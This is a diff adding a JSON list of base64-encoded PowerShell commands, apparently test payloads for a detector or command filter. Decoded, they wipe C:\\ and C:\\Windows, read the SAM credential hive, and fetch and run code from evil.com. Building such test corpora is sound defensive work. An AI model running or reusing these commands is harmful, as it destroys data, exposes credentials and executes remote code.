@@ -1,0 +1,14 @@
+[
+  {
+    "category": "powershell_encoded_commands",
+    "description": "Base64 encoded UTF-16LE PowerShell payloads attempting execution of destructive and evasive commands",
+    "payloads": [
+      "powershell.exe -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUAIABDADoAXAA=",
+      "powershell -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUAIABDADoAXAA=",
+      "pwsh -e aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwACkA",
+      "powershell.exe -ec ZABlAGwAIAAtAHIAIABDADoAXABXAGkAbgBkAG8AdwBzAA==",
+      "pwsh.exe -EncodedCommand RwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbwBuAGYAaQBnAFwAUwBBAE0A",
+      "cmd.exe /c powershell -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUAIABDADoAXAA="
+    ]
+  }
+]
